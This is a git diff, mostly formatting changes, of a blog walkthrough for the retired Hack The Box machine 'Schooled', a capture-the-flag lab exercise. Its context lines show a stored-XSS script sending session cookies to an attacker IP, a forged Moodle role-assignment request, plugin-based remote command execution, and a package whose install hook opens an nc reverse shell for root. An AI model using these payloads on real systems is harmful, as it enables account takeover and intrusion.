@@ -19,8 +19,9 @@ Hello guys!
 
 This week's machine will be **Schooled**, another medium-rated Linux box from [Hack The Box](https://www.hackthebox.eu/), created by [TheCyberGeek](https://app.hackthebox.eu/users/114053).
 
-\:information\_source: **Info**: Write-ups for Hack The Box machines are posted as soon as they’re retired.
-\[info]
+<Alert kind="info" title="Info">
+  Write-ups for Hack The Box machines are posted as soon as they're retired.
+</Alert>
 
 ![HTB Schooled](https://i.imgur.com/qw8zycI.png)
 
@@ -59,7 +60,7 @@ Nmap done: 1 IP address (1 host up) scanned in 16.06 seconds
 In parallel, after the initial scan, was also able to enumerate the port 33060/TCP, resulting in the following output:
 
 ```bash
-$ nmap -p 80,33060 -A -oA Full 10.10.10.234                                                                                     
+$ nmap -p 80,33060 -A -oA Full 10.10.10.234
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-01 14:57 -03
 Nmap scan report for schooled.htb (10.10.10.234)
 Host is up (0.077s latency).
@@ -207,13 +208,13 @@ Searching for **MoodleNet XSS**, I came across a [Security Announcement](https:/
 
 Searching for a PoC for the related CVE, found the repo [HoangKien1020/CVE-2020-25627: Stored XSS via moodlenetprofile parameter in user profile (github.com)](https://github.com/HoangKien1020/CVE-2020-25627) containing the instructions to exploit it, which was implemented and permitted us to obtain teacher's session cookie as evidence below:
 
-* Logged as the recently created user and modified the MoodleNet profile with the following content
+- Logged as the recently created user and modified the MoodleNet profile with the following content
 
 ```html
 <script>var i=new Image;i.src="http://10.10.10.10/xss.php?"+document.cookie;</script>
 ```
 
-* Hosted the `xss.php` in a folder and started a local PHP webserver, which 2 minutes later displayed us the teacher's cookie on the page
+- Hosted the `xss.php` in a folder and started a local PHP webserver, which 2 minutes later displayed us the teacher's cookie on the page
 
 ```bash
 $ sudo php -S 0.0.0.0:80 -t .
@@ -236,9 +237,9 @@ Searching about Moodle Exploitation on [Moodle - HackTricks](https://book.hacktr
 
 Besides not working well in our scenario, understanding the steps required used in the exploit, the following steps were executed to be able to get RCE:
 
-* The first thing would identify who in the platform could have manager permissions. Based on the institutional page, **Lianne Carter** is the school's manager and possibly has the rights we need.
-* Also took note of **Manuel Philips**' Profile id, which was obtained from his profile page at `http://moodle.schooled.htb/moodle/user/profile.php?id=24`.
-* Things started by enrolling the school's manager in the class and, intercepting the request and sending a copy of it to Burp's Repeater, also crafted a request granting us Manager Administration in the course, by assigning us the `roleid=1` in the request, as well as changing the assignee id to Manuel Philips, the same way as seen in the PoC video.
+- The first thing would identify who in the platform could have manager permissions. Based on the institutional page, **Lianne Carter** is the school's manager and possibly has the rights we need.
+- Also took note of **Manuel Philips**' Profile id, which was obtained from his profile page at `http://moodle.schooled.htb/moodle/user/profile.php?id=24`.
+- Things started by enrolling the school's manager in the class and, intercepting the request and sending a copy of it to Burp's Repeater, also crafted a request granting us Manager Administration in the course, by assigning us the `roleid=1` in the request, as well as changing the assignee id to Manuel Philips, the same way as seen in the PoC video.
 
 ```http
 GET /moodle/enrol/manual/ajax.php?mform_showmore_main=0&id=5&action=enrol&enrolid=10&sesskey=KbJYqTapFc&_qf__enrol_manual_enrol_users_form=1&mform_showmore_id_main=0&userlist%5B%5D=24&roletoassign=1&startdate=4&duration= HTTP/1.1
@@ -254,18 +255,21 @@ Cookie: MoodleSession=jil2s8i0vj0gq3vojfki6e7rtq
 Connection: close
 ```
 
-* Now as a course administrator, accessing a user's profile, we can see the "Log in as" link, which permitted us to impersonate Lianne Carter.
+- Now as a course administrator, accessing a user's profile, we can see the "Log in as" link, which permitted us to impersonate Lianne Carter.
 
-  ![HTB Schooled - Impersonating Manager in Moodle](https://i.imgur.com/zRjimbq.png)
-* Now as Lianne, we were supposed to be able to upload the plugin directly but, as this option isn't enabled in their tenant, we needed to first edit the Role permissions to allow this. Navigated to Site Administration pane > Users and then, under Permissions, selected Define roles.
+![HTB Schooled - Impersonating Manager in Moodle](https://i.imgur.com/zRjimbq.png)
 
-  ![HTB Schooled - Adjusting Role Definitions](https://i.imgur.com/6XmydvH.png)
-* Selected the **Manager** role and, after clicking in the "Edit" Button, intercepted the request, and appended the payload for full permissions, as shared also in the previously used script repo.
+- Now as Lianne, we were supposed to be able to upload the plugin directly but, as this option isn't enabled in their tenant, we needed to first edit the Role permissions to allow this. Navigated to Site Administration pane > Users and then, under Permissions, selected Define roles.
 
-  ![HTB Schooled - Modifying Manager role](https://i.imgur.com/lm0NOX7.png)
+![HTB Schooled - Adjusting Role Definitions](https://i.imgur.com/6XmydvH.png)
 
-  ![HTB Schooled - Appending payload to Edit Request](https://i.imgur.com/5L28UqN.png)
-* Now, navigating to Site Administration > Plugins we can see the Install Plugins option, where the rce.zip also available in the portal was available, which was uploaded with success, and allowed us to obtain RCE by calling the URL below, later changed to get a reverse shell
+- Selected the **Manager** role and, after clicking in the "Edit" Button, intercepted the request, and appended the payload for full permissions, as shared also in the previously used script repo.
+
+![HTB Schooled - Modifying Manager role](https://i.imgur.com/lm0NOX7.png)
+
+![HTB Schooled - Appending payload to Edit Request](https://i.imgur.com/5L28UqN.png)
+
+- Now, navigating to Site Administration > Plugins we can see the Install Plugins option, where the rce.zip also available in the portal was available, which was uploaded with success, and allowed us to obtain RCE by calling the URL below, later changed to get a reverse shell
 
 ```bash
 $ curl -X GET -G 'http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php' --data-urlencode 'cmd=id'
@@ -291,7 +295,7 @@ echo "?>" >> wget.php
 
 From the execution, the following information was obtained:
 
-* Users with console and their permissions:
+- Users with console and their permissions:
 
 ```plaintext
 jamie:*:1001:1001:Jamie:/home/jamie:/bin/sh
@@ -299,7 +303,7 @@ root:*:0:0:Charlie &:/root:/bin/csh
 steve:*:1002:1002:User &:/home/steve:/bin/csh
 ```
 
-* Moodle Database password in file \`/usr/local/www/apache24/data/moodle/config.php\` :
+- Moodle Database password in file \`/usr/local/www/apache24/data/moodle/config.php\` :
 
 ```plaintext
 $CFG->dbtype    = 'mysqli';
@@ -371,14 +375,14 @@ User jamie may run the following commands on Schooled:
 
 Checking the [GTFOBins page](https://gtfobins.github.io/gtfobins/pkg/) for `pkg` found that we might be able to install a crafted package to run a command. The below steps were used to obtain a reverse shell as root
 
-* Installed `fpm`, also available from this [Github Repository](https://github.com/jordansissel/fpm)
+- Installed `fpm`, also available from this [Github Repository](https://github.com/jordansissel/fpm)
 
 ```bash
 sudo apt-get install ruby ruby-dev rubygems build-essential
 sudo gem install --no-document fpm
 ```
 
-* Created a package containing the malicious payload from the attacker machine
+- Created a package containing the malicious payload from the attacker machine
 
 ```bash
 TF=$(mktemp -d)
@@ -387,7 +391,7 @@ echo 'rm $file;mkfifo $file;cat $file|/bin/sh -i 2>&1|nc 10.10.10.10 4443 >$file
 fpm -n x -s dir -t freebsd -a all --before-install $TF/x.sh $TF
 ```
 
-* Download package and install using `sudo` based on `jamie`'s permissions
+- Download package and install using `sudo` based on `jamie`'s permissions
 
 ```bash
 jamie@Schooled:/tmp $ /usr/local/bin/curl http://10.10.10.10/x-1.0.txz -o x-1.0.txz
